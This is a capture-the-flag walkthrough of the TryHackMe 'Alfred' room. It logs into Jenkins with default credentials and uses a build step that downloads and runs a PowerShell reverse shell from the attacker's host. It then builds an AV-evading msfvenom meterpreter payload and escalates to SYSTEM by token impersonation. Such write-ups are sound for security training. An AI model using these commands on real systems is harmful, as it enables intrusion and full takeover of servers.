![Alfred Logo](https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png)
```
Alfred
```
```
Task 1: Initial Access
```
In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.


1. How many ports are open? (TCP only) => 3
	1. nmap -sC -Pn -oN /home/kali/TryHackMe/Alfred/nmap/Initial 10.10.53.118
	```
	# Nmap 7.80 scan initiated Mon Oct  5 16:07:25 2020 as: nmap -sC -Pn -oN /home/kali/TryHackMe/Alfred/nmap/Initial 10.10.53.118                                                                                                             
	Nmap scan report for 10.10.53.118                                                                                                                                                                                                          
	Host is up (0.43s latency).                                                                                                                                                                                                                
	Not shown: 997 filtered ports                                                                                                                                                                                                              
	PORT     STATE SERVICE                                                                                                                                                                                                                     
	80/tcp   open  http                                                                                                                                                                                                                        
	| http-methods:                                                                                                                                                                                                                            
	|_  Potentially risky methods: TRACE                                                                                                                                                                                                       
	|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                       
	3389/tcp open  ms-wbt-server                                                                                                                                                                                                               
	|_ssl-date: 2020-10-05T20:08:19+00:00; +21s from scanner time.                                                                                                                                                                             
	8080/tcp open  http-proxy                                                                                                                                                                                                                  
	| http-robots.txt: 1 disallowed entry                                                                                                                                                                                                      
	|_/                                                                                                                                                                                                                                        
	|_http-title: Site doesn't have a title (text/html;charset=utf-8).                                                                                                                                                                                                                                                                                                                      
	Host script results:                                                                                                                                                                                                                       
	|_clock-skew: 20s                                                                                                                                                                                                                                                                                                                                                                                                            
	# Nmap done at Mon Oct  5 16:08:57 2020 -- 1 IP address (1 host up) scanned in 91.52 seconds 
	```
2. What is the username and password for the log in panel(in the format username:password) => admin:admin
	1. Navigate to http://$Machine_IP_Address:8080
	2. Enter admin as username and password and you will get loggedin (Simple guess)
3. Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server
4. What is the user.txt flag? => ***************************
	1. Download the nishang script from the Github link => https://github.com/samratashok/nishang.git
	2. In your local machine run a python server in the Shell directory under nishang => python3 -m http.server 
	3. Run a local net-cat using nc -lvnp 9001
	4. Now on the Jenkins navigate to http://$Machine_IP_Address:8080/job/project/configure => "Build"
	5. Now enter this command: powershell iex (New-Object Net.WebClient).DownloadString('http://$IP_Address:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $Your_IP_Address -Port 9001 and click on apply
	6. Now go to Main Dashboard and click on "Build now" button notice that the nishang script is called and you get a shell via nc
	7. Navigate to C:\Users\bruce\Desktop and type users.txt and you get the user flag.

```
Task 2: Switching Shells
```
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

1. Use msfvenom to create the a windows meterpreter reverse shell using the following payload
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[Your_IP_Address] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

2. After creating this payload, download it to the machine using the same method in the previous step (use the current nc shell to download the paylaod):
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$Your_IP_Address:8000//venom.exe','venom.exe')"
```
3. Before running this program, ensure the handler is set up in metasploit:
```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST $Your_IP_Address set LPORT 9002 run
```
4. ï»¿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell (Run from NC shell)
```
Start-Process "shell-name.exe"
```
5. What is the final size of the exe payload that you generated? => 73802

```
Task 3:  Privilege Escalation
```
Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

user SIDs(security identifier)
group SIDs
privileges
amongst other things. More detailed information can be found https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens.

There are two types of access tokens:

primary access tokens: those associated with a user account that are generated on log on
impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
For an impersonation token, there are different levels:

SecurityAnonymous: current user/client cannot impersonate another user/client
SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
SecurityImpersonation: current user/client can impersonate the client's security context on the local system
SecurityDelegation: current user/client can impersonate the client's security context on a remote system
where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege

https://www.exploit-db.com/papers/42556


1. View all the privileges using whoami /priv => shell => whoami /priv
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

```
2. You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.
```
meterpreter> load incognito
```
3. To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command? => NT AUTHORITY\SYSTEM
	1. meterprter > load_tokens -g
	```
	Delegation Tokens Available
	========================================
	\
	BUILTIN\Administrators
	BUILTIN\Users
	NT AUTHORITY\Authenticated Users
	NT AUTHORITY\NTLM Authentication
	NT AUTHORITY\SERVICE
	NT AUTHORITY\This Organization
	NT AUTHORITY\WRITE RESTRICTED
	NT SERVICE\AppHostSvc
	NT SERVICE\AudioEndpointBuilder
	NT SERVICE\BFE
	NT SERVICE\CertPropSvc
	NT SERVICE\CscService
	NT SERVICE\Dnscache
	NT SERVICE\eventlog
	NT SERVICE\EventSystem
	NT SERVICE\FDResPub
	NT SERVICE\iphlpsvc
	NT SERVICE\LanmanServer
	NT SERVICE\MMCSS
	NT SERVICE\PcaSvc
	NT SERVICE\PlugPlay
	NT SERVICE\RpcEptMapper
	NT SERVICE\Schedule
	NT SERVICE\SENS
	NT SERVICE\SessionEnv
	NT SERVICE\Spooler
	NT SERVICE\TrkWks
	NT SERVICE\TrustedInstaller
	NT SERVICE\UmRdpService
	NT SERVICE\UxSms
	NT SERVICE\Winmgmt
	NT SERVICE\WSearch
	NT SERVICE\wuauserv
	Impersonation Tokens Available
	========================================
	BUILTIN\IIS_IUSRS
	NT AUTHORITY\NETWORK
	NT SERVICE\AudioSrv
	NT SERVICE\DcomLaunch
	NT SERVICE\Dhcp
	NT SERVICE\DPS
	NT SERVICE\lmhosts
	NT SERVICE\MpsSvc
	NT SERVICE\netprofm
	NT SERVICE\nsi
	NT SERVICE\PolicyAgent
	NT SERVICE\Power
	NT SERVICE\ShellHWDetection
	NT SERVICE\W32Time
	NT SERVICE\WdiServiceHost
	NT SERVICE\WinHttpAutoProxySvc
	NT SERVICE\wscsvc
	``` 
	2. meterpreter > impersonate_token "BUILTIN\Administrators"
	```
	-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
	[+] Delegation token available
	[+] Successfully impersonated user NT AUTHORITY\SYSTEM
	```
	3. meterpreter > getuid
	```
	Server username: NT AUTHORITY\SYSTEM
	```
4. Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
	1. meterpreter > ps
	2. meterpreter > migrate pid in my case 612 (winlogon.exe)
5. read the root.txt file at C:\Windows\System32\config => ***************************
	1. meterpreter cat read the root.txt file at C:\Windows\System32\config\root.txt
